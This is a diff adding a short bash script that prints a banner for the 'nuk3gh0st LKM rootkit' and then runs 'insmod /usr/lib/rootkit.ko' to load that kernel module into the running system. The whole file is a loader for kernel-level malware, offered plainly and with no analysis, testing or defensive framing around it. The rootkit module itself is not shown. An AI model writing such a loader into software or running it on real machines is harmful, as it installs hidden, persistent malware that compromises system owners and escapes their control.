@@ -1,0 +1,7 @@
+#!/bin/bash
+echo "#################################"
+echo "# Loading nuk3gh0st LKM rootkit #"
+echo "#################################"
+echo ""
+echo "insmod /usr/lib/rootkit.ko"
+insmod /usr/lib/rootkit.ko
